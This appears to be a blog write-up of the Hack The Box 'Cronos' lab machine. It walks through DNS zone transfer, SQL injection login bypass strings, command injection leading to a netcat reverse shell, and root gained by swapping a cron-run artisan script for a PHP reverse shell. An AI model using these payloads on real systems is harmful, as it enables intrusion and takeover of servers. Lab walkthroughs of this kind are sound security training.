@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Cronos</strong></h1>
+        <em>Released: 22nd March 2017 / Pwned: September 19th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Cronos first has you perform a DNS zone transfer against the box to find a hidden admin subdirectory. You then use a simple SQL injection string to get into the admin panel, and get a shell by exploiting the traceroute functionality using command injection. To elevate to root, you exploit a cron job which is running a writable file as root.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Find open TCP ports - <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.13</code><br>
+        In-depth scan open TCP ports - <code>nmap -p 22,53,80 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.13</code><br>
+        <br>
+        -T4 aggressive scan<br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-allports.txt&nbsp;10.10.10.13<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;ssh<br>
+                53/tcp&nbsp;open&nbsp;&nbsp;domain<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http<br>
+                <br>
+                root@gotham:~/ctf/cronos#&nbsp;nmap&nbsp;-p&nbsp;22,53,80&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-openports.txt&nbsp;10.10.10.13<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.1&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20&nbsp;(ED25519)<br>
+                53/tcp&nbsp;open&nbsp;&nbsp;domain&nbsp;&nbsp;ISC&nbsp;BIND&nbsp;9.10.3-P4&nbsp;(Ubuntu&nbsp;Linux)<br>
+                |&nbsp;dns-nsid:&nbsp;<br>
+                |_&nbsp;&nbsp;bind.version:&nbsp;9.10.3-P4-Ubuntu<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;((Ubuntu))<br>
+                |_http-server-header:&nbsp;Apache/2.4.18&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Apache2&nbsp;Ubuntu&nbsp;Default&nbsp;Page:&nbsp;It&nbsp;works
+            </div>
+        </div><br>
+        <br>
+        Analysis of open ports:<br>
+        • 22/ssh - Nothing to do with ssh for the time being, but useful to know<br>
+        • 53/dns - DNS is running, which makes me think we should perform a zone transfer to find subdomains<br>
+        • 80/http - A webserver, which most likely has a subdomain(s)<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 53/dns - DNS Zone Transfer</strong></h2><br>
+        A DNS zone transfer will reveal if there are any subdomains on the web server.<br>
+        To run a zone transfer, you need to specify the domain name to query and the DNS server's address.<br>
+        <code>host -l &lt;domain name&gt; &lt;dns server address&gt;</code><br>
+        <br>
+        This means you need to set a domain name for the website running on <code>http://10.10.10.13</code>.<br>
+        hackthebox box domain names often follow the format <code>&lt;box name&gt;.htb</code><br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>2a) Configure /etc/hosts</strong></h3><br>
+        Configure your /etc/hosts file so that <code>10.10.10.13</code> points to <code>cronos.htb</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;nano&nbsp;/etc/hosts<br>
+                [...]<br>
+                10.10.10.13&nbsp;cronos.htb
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2b) Run DNS Zone Transfer</strong></h3><br>
+        Now you can perform a DNS zone transfer using <code>host</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;host&nbsp;-l&nbsp;cronos.htb&nbsp;10.10.10.13<br>
+                Using&nbsp;domain&nbsp;server:<br>
+                Name:&nbsp;10.10.10.13<br>
+                Address:&nbsp;10.10.10.13#53<br>
+                Aliases:&nbsp;<br>
+                <br>
+                cronos.htb&nbsp;name&nbsp;server&nbsp;ns1.cronos.htb.<br>
+                cronos.htb&nbsp;has&nbsp;address&nbsp;10.10.10.13<br>
+                admin.cronos.htb&nbsp;has&nbsp;address&nbsp;10.10.10.13<br>
+                ns1.cronos.htb&nbsp;has&nbsp;address&nbsp;10.10.10.13<br>
+                www.cronos.htb&nbsp;has&nbsp;address&nbsp;10.10.10.13
+            </div>
+        </div><br>
+        <br>
+        It appears the web server has a subdomain - <code>admin.cronos.htb</code><br>
+        Add this subdomain to your /etc/hosts file so that you can access it (if you get Burp errors, just disable burp)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;nano&nbsp;/etc/hosts<br>
+                [...]<br>
+                10.10.10.13&nbsp;cronos.htb<br>
+                10.10.10.13&nbsp;admin.cronos.htb
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) admin.cronos.htb</strong></h2><br>
+        Visit <code>http://admin.cronos.htb</code> and you'll be greeted to a login panel.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        After visiting <a href="http://10.10.10.13,">http://10.10.10.13,</a> <a href="http://cronos.htb,">http://cronos.htb,</a> and <a href="http://admin.cronos.htb,">http://admin.cronos.htb,</a> gobuster'ing each of them, general reconnaissance etc. there wasn't anything to be found. The only thought I had left was to try SQL injection at the login form, which worked.<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3a) SQL Injection</strong></h3><br>
+        Here are my basic SQL injection tests:<br>
+        <code>' OR '1<br>
+        ' OR '1'='1<br>
+        ' OR 1 -- -<br>
+        " OR "" = "<br>
+        " OR 1 = 1 -- -<br>
+        '='<br>
+        'LIKE'<br>
+        '=0--+</code><br>
+        <br>
+        This one worked - <code>' OR 1 -- -</code><br>
+        <br>
+        Log in to the admin panel using:<br>
+        username: <code>' OR 1 -- -</code><br>
+        password: <code>' OR 1 -- -</code> (can be anything, actually)<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>3b) Command Injection</strong></h3><br>
+        We can run system commands - <code>traceroute</code> and <code>ping</code>.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        This form is vulnerable to command injection.<br>
+        <code>;</code> allows you to input multiple bash commands on one line.<br>
+        This means we can inject shell commands at this form e.g.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        With this, we can get a shell on the system.<br>
+        <br>
+        Start a listener on your attacking machine<br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        netcat is installed on the target, but -e is disabled.<br>
+        This can be circumvented with piped shell.<br>
+        <br>
+        Send a reverse shell to your attacking system on the Net Tool v0.1 with<br>
+        <code>; mkfifo /tmp/f ; nc 10.10.14.15 9001 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt; /tmp/f ; rm /tmp/f</code><br>
+        <br>
+        And you should get a shell on your listener<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.15]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.13]&nbsp;52302<br>
+                id<br>
+                uid=33(www-data)&nbsp;gid=33(www-data)&nbsp;groups=33(www-data)
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>3c) socat - Elevate to interactive shell</strong></h3><br>
+        I eleveated to an interactive shell using socat.<br>
+        socat is basically netcat on steroids.<br>
+        You'll have a full interactive shell with tab-completion, arrow keys, nano support etc.<br>
+        <br>
+        socat isn't available on Cronos, but you can download a precompiled socat binary from here - <a href="https://github.com/andrew-d/static-binaries/tree/master/binaries/linux">https://github.com/andrew-d/static-binaries/tree/master/binaries/linux</a> - and serve it to the target from you attacking machine.<br>
+        <br>
+        Download 64bit precomipled socat binary to your attacking machine and serve it using <code>python -m SimpleHTTPServer</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;wget&nbsp;-q&nbsp;https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat<br>
+                root@gotham:~/ctf/cronos#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine<br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;socat&nbsp;file:`tty`,raw,echo=0&nbsp;tcp-listen:9002
+            </div>
+        </div><br>
+        <br>
+        Now you want to run socat on the target.<br>
+        This one-liner will download socat to the target from your attacking machine into /tmp, make it executable, and connect back to your listener<br>
+            <div class="codebox">
+                wget&nbsp;-q&nbsp;http://10.10.14.15:8000/socat&nbsp;-O&nbsp;/tmp/socat;&nbsp;chmod&nbsp;+x&nbsp;/tmp/socat;&nbsp;/tmp/socat&nbsp;exec:'bash&nbsp;-li',pty,stderr,setsid,sigint,sane&nbsp;tcp:10.10.14.15:9002
+            </div>
+        </div><br>
+        <br>
+        Check your socat listener, and you should have a shell.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;socat&nbsp;file:`tty`,raw,echo=0&nbsp;tcp-listen:9002<br>
+                www-data@cronos:/var/www/admin$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Go grab <code>user.txt</code> from <code>noulis</code>'s home directory.<br>
+            <div class="codebox">
+                www-data@cronos:/var/www/admin$&nbsp;ls&nbsp;-alh&nbsp;/home/*/*<br>
+                -r--r--r--&nbsp;1&nbsp;noulis&nbsp;noulis&nbsp;33&nbsp;Mar&nbsp;22&nbsp;&nbsp;2017&nbsp;/home/noulis/user.txt<br>
+                www-data@cronos:/var/www/admin$&nbsp;cat&nbsp;/home/noulis/user.txt&nbsp;<br>
+                51d236438...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1><br>
+        MySQL credentials are available in <code>/var/www/admin/config.php</code><br>
+        <code>admin</code>'s MD5 hashed password in MySQL is <code>4f5fffa7b2340178a716e3832451e058</code> = <code>1327663704</code><br>
+        Composer keys owned by root are available in <code>/home/noulis/.composer</code><br>
+        <br>
+        But none of this stuff is useful :(<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) cronjobs</strong></h2><br>
+        Check for system wide cron jobs by reading <code>/etc/crontab</code><br>
+            <div class="codebox">
+                www-data@cronos:/var/www/admin$&nbsp;cat&nbsp;/etc/crontab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                #&nbsp;/etc/crontab:&nbsp;system-wide&nbsp;crontab<br>
+                #&nbsp;Unlike&nbsp;any&nbsp;other&nbsp;crontab&nbsp;you&nbsp;don't&nbsp;have&nbsp;to&nbsp;run&nbsp;the&nbsp;`crontab'<br>
+                #&nbsp;command&nbsp;to&nbsp;install&nbsp;the&nbsp;new&nbsp;version&nbsp;when&nbsp;you&nbsp;edit&nbsp;this&nbsp;file<br>
+                #&nbsp;and&nbsp;files&nbsp;in&nbsp;/etc/cron.d.&nbsp;These&nbsp;files&nbsp;also&nbsp;have&nbsp;username&nbsp;fields,<br>
+                #&nbsp;that&nbsp;none&nbsp;of&nbsp;the&nbsp;other&nbsp;crontabs&nbsp;do.<br>
+                <br>
+                SHELL=/bin/sh<br>
+                PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br>
+                <br>
+                #&nbsp;m&nbsp;h&nbsp;dom&nbsp;mon&nbsp;dow&nbsp;user command<br>
+                17&nbsp;* *&nbsp;*&nbsp;* root&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;/&nbsp;&amp;&amp;&nbsp;run-parts&nbsp;--report&nbsp;/etc/cron.hourly<br>
+                25&nbsp;6 *&nbsp;*&nbsp;* root test&nbsp;-x&nbsp;/usr/sbin/anacron&nbsp;||&nbsp;(&nbsp;cd&nbsp;/&nbsp;&amp;&amp;&nbsp;run-parts&nbsp;--report&nbsp;/etc/cron.daily&nbsp;)<br>
+                47&nbsp;6 *&nbsp;*&nbsp;7 root test&nbsp;-x&nbsp;/usr/sbin/anacron&nbsp;||&nbsp;(&nbsp;cd&nbsp;/&nbsp;&amp;&amp;&nbsp;run-parts&nbsp;--report&nbsp;/etc/cron.weekly&nbsp;)<br>
+                52&nbsp;6 1&nbsp;*&nbsp;* root test&nbsp;-x&nbsp;/usr/sbin/anacron&nbsp;||&nbsp;(&nbsp;cd&nbsp;/&nbsp;&amp;&amp;&nbsp;run-parts&nbsp;--report&nbsp;/etc/cron.monthly&nbsp;)<br>
+                *&nbsp;*&nbsp;*&nbsp;*&nbsp;* root php&nbsp;/var/www/laravel/artisan&nbsp;schedule:run&nbsp;&gt;&gt;&nbsp;/dev/null&nbsp;2&gt;&amp;1<br>
+                #
+            </div>
+        </div><br>
+        <br>
+        <code>root php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1</code> looks interesting.<br>
+        The job runs <code>/var/www/laravel/artisan</code> as root.<br>
+        <br>
+        We're currently running as user <code>www-data</code>.<br>
+        We most likely have write access to <code>artisan</code> considering it's in <code>/var/www</code><br>
+        <br>
+        Double-check if we have write permissions for <code>/var/www/laravel/artisan</code><br>
+            <div class="codebox">
+                www-data@cronos:/var/www/laravel$&nbsp;ls&nbsp;-l&nbsp;/var/www/laravel/artisan<br>
+                -rw-r--r--&nbsp;1&nbsp;www-data&nbsp;www-data&nbsp;3479&nbsp;Sep&nbsp;19&nbsp;15:14&nbsp;/var/www/laravel/artisan
+            </div>
+        </div><br>
+        <br>
+        We do!<br>
+        We have write permissions on a file that a cron job runs as root, which means that we effectively have root code execution.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Root shell by modifying artisan</strong></h2><br>
+        Copy pentest-monkey's php-reverse-shell to your current directory.<br>
+        Write <code>#!/usr/bin/env php</code> to the top of the file (like the artisan script has) and modify the IP and port variables so that the script will connect back to you. Rename the script to <code>artisan</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;cp&nbsp;/usr/share/webshells/php/php-reverse-shell.php&nbsp;.<br>
+                root@gotham:~/ctf/cronos#&nbsp;mv&nbsp;php-reverse-shell.php&nbsp;monkey.php<br>
+                root@gotham:~/ctf/cronos#&nbsp;nano&nbsp;monkey.php<br>
+                #!/usr/bin/env&nbsp;php<br>
+                &lt;?php<br>
+                [..]<br>
+                set_time_limit&nbsp;(0);<br>
+                $VERSION&nbsp;=&nbsp;"1.0";<br>
+                $ip&nbsp;=&nbsp;'10.10.14.15';&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br>
+                $port&nbsp;=&nbsp;9003;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br>
+                $chunk_size&nbsp;=&nbsp;1400;<br>
+                $write_a&nbsp;=&nbsp;null;<br>
+                [...]<br>
+                root@gotham:~/ctf/cronos#&nbsp;cp&nbsp;monkey.php&nbsp;artisan
+            </div>
+        </div><br>
+        <br>
+        Serve the script to Cronos using <code>python -m SimpleHTTPServer</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And start a listener on your attacking machine to receive the shell.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/cronos#&nbsp;nc&nbsp;-lvnp&nbsp;9003<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9003&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Back on Cronos, make a backup of artisan - <code>artisan.bkup</code> - and download your modified artisan script (your reverse shell) to the target.<br>
+            <div class="codebox">
+                www-data@cronos:/var/www/laravel$&nbsp;mv&nbsp;artisan&nbsp;artisan.bkup<br>
+                www-data@cronos:/var/www/laravel$&nbsp;wget&nbsp;http://10.10.14.15:8000/artisan&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                [...]<br>
+                www-data@cronos:/var/www/laravel$&nbsp;head&nbsp;artisan<br>
+                #!/usr/bin/env&nbsp;php<br>
+                &lt;?php<br>
+                set_time_limit&nbsp;(0);<br>
+                $VERSION&nbsp;=&nbsp;"1.0";<br>
+                $ip&nbsp;=&nbsp;'10.10.14.15';&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br>
+                $port&nbsp;=&nbsp;9003;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br>
+                $chunk_size&nbsp;=&nbsp;1400;<br>
+                $write_a&nbsp;=&nbsp;null;<br>
+                $error_a&nbsp;=&nbsp;null;<br>
+                $shell&nbsp;=&nbsp;'uname&nbsp;-a;&nbsp;w;&nbsp;id;&nbsp;/bin/sh&nbsp;-i';
+            </div>
+        </div><br>
+        <br>
+        A cron job will run your modified <code>artisan</code> script.<br>
+        Watch your listener, wait a few minutes, and you should receive a root shell.<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9003&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.15]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.13]&nbsp;43280<br>
+                Linux&nbsp;cronos&nbsp;4.4.0-72-generic&nbsp;#93-Ubuntu&nbsp;SMP&nbsp;Fri&nbsp;Mar&nbsp;31&nbsp;14:07:41&nbsp;UTC&nbsp;2017&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux<br>
+                &nbsp;15:15:01&nbsp;up&nbsp;&nbsp;2:27,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                /bin/sh:&nbsp;0:&nbsp;can't&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                #&nbsp;cat&nbsp;/root/root.txt<br>
+                1703b8a3c...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
